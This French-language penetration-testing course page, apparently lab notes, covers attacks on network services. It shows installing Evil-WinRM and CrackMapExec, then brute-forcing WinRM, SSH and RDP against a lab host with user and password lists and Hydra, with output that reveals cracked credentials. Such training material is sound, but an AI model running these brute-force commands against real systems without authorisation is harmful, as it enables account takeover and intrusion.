# Service Réseau

## Introduction

Au cours de nos tests d'intrusion, chaque réseau informatique que nous rencontrons disposera de services installés pour gérer, modifier ou créer du contenu. Tous ces services sont hébergés à l'aide d'autorisations spécifiques et sont attribués à des utilisateurs spécifiques. Outre les applications Web, ces services incluent (mais ne sont pas limités à) :

|           |       |             |
| --------- | ----- | ----------- |
| FTP       | SMB   | NFS         |
| IMAP/POP3 | SSH   | MySQL/MSSQL |
| RDP       | WinRM | VNC         |
| Telnet    | SMTP  | LDAP        |

## WinRM

La gestion à distance de Windows (WinRM) est l'implémentation Microsoft du protocole réseau Web Services Management Protocol (WS-Management). Il s'agit d'un protocole réseau basé sur des services Web XML utilisant le protocole SOAP (Simple Object Access Protocol) utilisé pour la gestion à distance des systèmes Windows. Il prend en charge la communication entre Web-Based Enterprise Management (WBEM) et Windows Management Instrumentation (WMI), qui peut appeler le Distributed Component Object Model (DCOM).

Cependant, pour des raisons de sécurité, WinRM doit être activé et configuré manuellement dans Windows 10. Par conséquent, cela dépend fortement de la sécurité de l'environnement dans un domaine ou un réseau local où nous voulons utiliser WinRM. Dans la plupart des cas, on utilise des certificats ou seulement des mécanismes d'authentification spécifiques pour augmenter sa sécurité. WinRM utilise les ports TCP 5985 (HTTP) et 5986 (HTTPS).

Un outil pratique que nous pouvons utiliser pour nos attaques par mot de passe est CrackMapExec, qui peut également être utilisé pour d'autres protocoles tels que SMB, LDAP, MSSQL et autres. Nous vous recommandons de lire la documentation officielle de cet outil pour vous familiariser avec celui-ci.

<hr>

## EvilWinRM
EvilWinRM permet de se connecter à un serveur par WinRM (donc c'est un client winrm)

### Installation
```
dsgsec@htb[/htb]$ sudo gem install evil-winrm

Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :)
```

### Utilisation
```
dsgsec@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```


## CrackMapExec
### **Installation de CrackMapExec**

Nous pouvons installer CrackMapExec via apt sur un hôte Parrot ou cloner le référentiel GitHub et suivre les différentes méthodes d'installation, telles que l'installation à partir de la source et éviter les problèmes de dépendance.

```
dsgsec@htb[/htb]$ sudo apt-get -y install crackmapexec
```

### CrackMapExec Protocol-Specific Help
Notez que nous pouvons spécifier un protocole spécifique et recevoir un menu d'aide plus détaillé de toutes les options qui s'offrent à nous. CrackMapExec prend actuellement en charge l'authentification à distance à l'aide de MSSQL, SMB, SSH et WinRM.
```
dsgsec@htb[/htb]$ crackmapexec smb -h

usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]]
                        [-k] [--aesKey] [--kdcHost] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT]
                        [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {http,https}]
                        [--server-host HOST] [--server-port PORT] [-H HASH [HASH ...]] [--no-bruteforce]
                        [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE] [--gen-relay-list OUTPUT_FILE]
                        [--continue-on-success] [--sam | --lsa | --ntds [{drsuapi,vss}]] [--shares] [--sessions]
                        [--disks] [--loggedon-users] [--users [USER]] [--groups [GROUP]] [--local-groups [GROUP]]
                        [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE]
                        [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
                        [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files]
                        [--put-file FILE FILE] [--get-file FILE FILE]
                        [--exec-method {atexec,wmiexec,smbexec,mmcexec}] [--force-ps32] [--no-output]
                        [-x COMMAND | -X PS_COMMAND] [--obfs] [--clear-obfscripts]
                        [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of
                        targets, NMap XML or .Nessus file(s)

optional arguments:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)
```

### CrackMapExec Usage
```
dsgsec@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
```
dsgsec@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```
L'apparition de (**Pwn3d!**) est le signe que nous pouvons très probablement exécuter des commandes système si nous nous connectons avec l'utilisateur brute-forcé. 
Un autre outil pratique que nous pouvons utiliser pour communiquer avec le service WinRM est Evil-WinRM, qui nous permet de communiquer efficacement avec le service WinRM.

<hr>

## SSH
Secure Shell (SSH) est un moyen plus sûr de se connecter à un hôte distant pour exécuter des commandes système ou transférer des fichiers d'un hôte vers un serveur. Le serveur SSH fonctionne par défaut sur le port TCP 22, auquel nous pouvons nous connecter à l'aide d'un client SSH. Ce service utilise trois opérations/méthodes de cryptographie différentes : le chiffrement symétrique, le chiffrement asymétrique et le hachage.

### Bruteforce - Hydra
#### SSH
Hydra est un outil permettant de faire du bruteforce sur plusieurs services différents, voici un exemple avec un bruteforce SSH

```
dsgsec@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

#### RDP
```
dsgsec@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```
